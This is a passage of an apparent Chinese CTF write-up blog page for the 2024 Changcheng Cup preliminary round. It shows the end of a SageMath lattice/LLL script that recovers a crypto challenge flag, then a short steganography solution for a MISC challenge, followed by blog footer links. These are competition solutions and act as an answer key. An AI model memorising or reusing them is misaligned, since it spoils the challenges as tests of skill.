class="number">2</span>)**(-<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/die/lxz/lxz.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        b.append(<span class="built_in">float</span>(line.strip().decode()))</span><br><span class="line">n = <span class="number">85</span></span><br><span class="line">kkk= <span class="number">10</span> ^ <span class="number">20</span></span><br><span class="line">A = gravity(n)</span><br><span class="line"></span><br><span class="line">A = [[<span class="built_in">int</span>(j * kkk) <span class="keyword">for</span> j <span class="keyword">in</span> i] <span class="keyword">for</span> i <span class="keyword">in</span> A]</span><br><span class="line">b = [<span class="built_in">int</span>(i * (-<span class="number">1</span>) * kkk) <span class="keyword">for</span> i <span class="keyword">in</span> b]</span><br><span class="line">M = [A[i] + [<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">M.append(b + [<span class="number">1</span>])</span><br><span class="line">M = Matrix(ZZ, n + <span class="number">1</span>, n + <span class="number">1</span>, M)</span><br><span class="line">zz= M.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(zz)</span><br><span class="line">flag = M.solve_left(zz)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="cloacked"><a href="#cloacked" class="headerlink" title="cloacked"></a>cloacked</h3><p>将文件头补成<code>.zip</code>的格式，解压得到文件，转成图片， <code>cloacked-pixel</code>解密后改后缀为<code>zip</code>，打开得到<code>flag</code>：<code>Flag&#123;just_a_demo_flag&#125;</code></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>viol1t</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://viol1t.gitee.io/2024/05/13/2024%E5%B9%B4%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">https://viol1t.gitee.io/2024/05/13/2024%E5%B9%B4%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/re/"># re</a>
+                    
+                        <a href="/tags/crypto/"># crypto</a>
+                    
+                        <a href="/tags/misc/"># misc</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/04/09/2023%E5%B9%B4%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9B-PWN/">2023年香山杯决赛-PWN</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
